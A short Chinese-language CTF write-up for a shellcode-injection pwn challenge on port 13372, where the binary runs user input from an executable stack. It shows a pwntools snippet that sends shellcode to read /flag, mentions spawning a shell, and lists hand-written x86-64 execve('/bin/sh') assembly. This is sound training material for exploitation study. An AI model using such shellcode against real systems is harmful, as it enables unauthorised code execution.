# WP：02-shellcode

## 题目信息

- 类型：shellcode 注入
- 保护：NX 关闭（`-z execstack`）、No PIE、No Canary
- 端口：13372

## 分析

`vuln()` 把输入读进 `buf[0x100]`，然后直接 `((void(*)())buf)()`——把 buf 当函数指针调用。

栈可执行（`execstack`），直接往 buf 里写 shellcode 即可。

## Exploit

用 pwntools `shellcraft.cat('/flag')` 生成读 flag 的 shellcode：

```python
shellcode = asm(shellcraft.cat('/flag'))
r.send(shellcode)
```

也可以用 `shellcraft.sh()` 拿交互式 shell，再手动 `cat /flag`。

## 扩展

如果想手写 shellcode，核心是 `execve("/bin/sh", ["/bin/sh", NULL], NULL)` 对应的 syscall 序列：

```asm
xor  rsi, rsi
xor  rdx, rdx
lea  rdi, [rip+binsh]
mov  rax, 59
syscall
binsh: .string "/bin/sh"
```
